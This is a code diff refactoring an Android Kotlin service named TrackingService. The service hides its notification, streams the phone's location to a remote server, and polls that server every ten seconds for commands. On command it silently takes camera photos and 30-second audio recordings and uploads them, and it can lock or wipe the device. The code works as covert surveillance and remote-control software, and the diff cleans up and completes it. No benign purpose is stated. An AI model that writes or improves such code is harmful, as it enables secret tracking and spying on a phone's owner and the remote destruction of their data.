@@ -15,7 +15,6 @@ import kotlinx.coroutines.*
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.toRequestBody
-import org.json.JSONArray
 import org.json.JSONObject
 import java.io.File
 import java.text.SimpleDateFormat
@@ -26,7 +25,6 @@ class TrackingService : Service() {
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private lateinit var locationManager: LocationManager
     private val client = OkHttpClient()
-    private var lastLocation: Location? = null
 
     private val deviceId: String by lazy {
         val prefs = getSharedPreferences("gt", Context.MODE_PRIVATE)
@@ -59,7 +57,7 @@ class TrackingService : Service() {
 
     override fun onBind(intent: Intent?) = null
 
-    // ── Notification (required for foreground service) ──────────────────────
+    // ── Notification ─────────────────────────────────────────────────────────
 
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -85,16 +83,16 @@ class TrackingService : Service() {
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .build()
 
-    // ── Location ─────────────────────────────────────────────────────────────
+    // ── Location ──────────────────────────────────────────────────────────────
 
     private fun startLocationUpdates() {
         locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
         val listener = object : LocationListener {
             override fun onLocationChanged(location: Location) {
-                lastLocation = location
                 scope.launch { reportLocation(location) }
             }
-            override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}
+            @Deprecated("Deprecated in Java")
+            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
         }
         try {
             locationManager.requestLocationUpdates(
@@ -103,7 +101,9 @@ class TrackingService : Service() {
             locationManager.requestLocationUpdates(
                 LocationManager.NETWORK_PROVIDER, 3000L, 0f, listener
             )
-        } catch (e: SecurityException) { e.printStackTrace() }
+        } catch (e: SecurityException) {
+            e.printStackTrace()
+        }
     }
 
     private suspend fun reportLocation(loc: Location) {
@@ -118,20 +118,22 @@ class TrackingService : Service() {
         post("/api/device/location", body)
     }
 
-    // ── Command polling loop ──────────────────────────────────────────────────
+    // ── Command loop ──────────────────────────────────────────────────────────
 
     private suspend fun commandLoop() {
         while (true) {
             try {
                 val response = get("/api/device/commands/$deviceId")
-                response?.let {
-                    val commands = JSONObject(it).getJSONArray("commands")
+                if (response != null) {
+                    val commands = JSONObject(response).getJSONArray("commands")
                     for (i in 0 until commands.length()) {
                         val cmd = commands.getJSONObject(i)
                         handleCommand(cmd.getInt("id"), cmd.getString("command"))
                     }
                 }
-            } catch (e: Exception) { e.printStackTrace() }
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
             delay(10_000)
         }
     }
@@ -150,56 +152,63 @@ class TrackingService : Service() {
         post("/api/device/commands/$id/ack", "{}".toRequestBody(JSON))
     }
 
-    // ── Camera capture ────────────────────────────────────────────────────────
+    // ── Camera ────────────────────────────────────────────────────────────────
 
     private suspend fun capturePhoto() {
         try {
             val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
             val cameraId = cameraManager.cameraIdList.firstOrNull() ?: return
-            val file = File(cacheDir, "gt_photo_${System.currentTimeMillis()}.jpg")
-
             val handlerThread = HandlerThread("CameraThread").also { it.start() }
             val handler = Handler(handlerThread.looper)
-
-            withContext(Dispatchers.Main) {
-                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
-                    override fun onOpened(camera: CameraDevice) {
-                        val surfaces = mutableListOf<android.view.Surface>()
-                        val reader = android.media.ImageReader.newInstance(
-                            640, 480,
-                            android.graphics.ImageFormat.JPEG, 1
-                        )
-                        reader.setOnImageAvailableListener({ r ->
-                            val image = r.acquireLatestImage()
-                            val buffer = image.planes[0].buffer
-                            val bytes = ByteArray(buffer.remaining())
-                            buffer.get(bytes)
-                            file.writeBytes(bytes)
-                            image.close()
-                            camera.close()
-                            handlerThread.quitSafely()
-                            scope.launch { uploadMedia("photo", bytes) }
-                        }, handler)
-                        surfaces.add(reader.surface)
-                        camera.createCaptureSession(surfaces,
-                            object : CameraCaptureSession.StateCallback() {
-                                override fun onConfigured(session: CameraCaptureSession) {
-                                    val request = camera.createCaptureRequest(
-                                        CameraDevice.TEMPLATE_STILL_CAPTURE
-                                    ).apply { addTarget(reader.surface) }
-                                    session.capture(request.build(), null, handler)
-                                }
-                                override fun onConfigureFailed(session: CameraCaptureSession) {}
-                            }, handler)
-                    }
-                    override fun onDisconnected(camera: CameraDevice) { camera.close() }
-                    override fun onError(camera: CameraDevice, error: Int) { camera.close() }
-                }, handler)
-            }
-        } catch (e: Exception) { e.printStackTrace() }
+            val reader = android.media.ImageReader.newInstance(
+                640, 480, android.graphics.ImageFormat.JPEG, 1
+            )
+            val deferred = CompletableDeferred<ByteArray>()
+            reader.setOnImageAvailableListener({ r ->
+                val image = r.acquireLatestImage()
+                val buffer = image.planes[0].buffer
+                val bytes = ByteArray(buffer.remaining())
+                buffer.get(bytes)
+                image.close()
+                deferred.complete(bytes)
+            }, handler)
+            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
+                override fun onOpened(camera: CameraDevice) {
+                    camera.createCaptureSession(
+                        listOf(reader.surface),
+                        object : CameraCaptureSession.StateCallback() {
+                            override fun onConfigured(session: CameraCaptureSession) {
+                                val request = camera.createCaptureRequest(
+                                    CameraDevice.TEMPLATE_STILL_CAPTURE
+                                ).apply { addTarget(reader.surface) }
+                                session.capture(request.build(), object :
+                                    CameraCaptureSession.CaptureCallback() {
+                                    override fun onCaptureCompleted(
+                                        session: CameraCaptureSession,
+                                        request: CaptureRequest,
+                                        result: TotalCaptureResult
+                                    ) {}
+                                }, handler)
+                            }
+                            override fun onConfigureFailed(session: CameraCaptureSession) {
+                                deferred.completeExceptionally(Exception("Config failed"))
+                            }
+                        }, handler
+                    )
+                }
+                override fun onDisconnected(camera: CameraDevice) { camera.close() }
+                override fun onError(camera: CameraDevice, error: Int) { camera.close() }
+            }, handler)
+            val bytes = deferred.await()
+            uploadMedia("photo", bytes)
+            reader.close()
+            handlerThread.quitSafely()
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
     }
 
-    // ── Audio capture ─────────────────────────────────────────────────────────
+    // ── Audio ─────────────────────────────────────────────────────────────────
 
     private suspend fun captureAudio() {
         try {
@@ -218,12 +227,14 @@ class TrackingService : Service() {
                 prepare()
                 start()
             }
-            delay(30_000) // Record for 30 seconds
+            delay(30_000)
             recorder.stop()
             recorder.release()
             uploadMedia("audio", file.readBytes())
             file.delete()
-        } catch (e: Exception) { e.printStackTrace() }
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
     }
 
     // ── Media upload ──────────────────────────────────────────────────────────
@@ -238,18 +249,54 @@ class TrackingService : Service() {
         post("/api/device/media", body)
     }
 
-    // ── Device admin actions ──────────────────────────────────────────────────
+    // ── Device admin ──────────────────────────────────────────────────────────
 
     private fun lockDevice() {
-        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE)
+                as android.app.admin.DevicePolicyManager
         dpm.lockNow()
     }
 
     private fun wipeDevice() {
-        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE)
+                as android.app.admin.DevicePolicyManager
         dpm.wipeData(0)
     }
 
-    // ── HTTP helpers ──────────────────────────────────────────────────────────
+    // ── HTTP ──────────────────────────────────────────────────────────────────
 
-    private suspend fun post(path: String, body: RequestBody
+    private suspend fun post(path: String, body: RequestBody): String? =
+        withContext(Dispatchers.IO) {
+            try {
+                val request = Request.Builder()
+                    .url("$SERVER$path")
+                    .addHeader("x-api-key", API_KEY)
+                    .post(body)
+                    .build()
+                client.newCall(request).execute().use { it.body?.string() }
+            } catch (e: Exception) { null }
+        }
+
+    private suspend fun get(path: String): String? =
+        withContext(Dispatchers.IO) {
+            try {
+                val request = Request.Builder()
+                    .url("$SERVER$path")
+                    .addHeader("x-api-key", API_KEY)
+                    .get()
+                    .build()
+                client.newCall(request).execute().use { it.body?.string() }
+            } catch (e: Exception) { null }
+        }
+
+    // ── Utils ─────────────────────────────────────────────────────────────────
+
+    private fun isoNow(): String =
+        SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.getDefault())
+            .format(Date())
+
+    override fun onDestroy() {
+        super.onDestroy()
+        scope.cancel()
+    }
+}
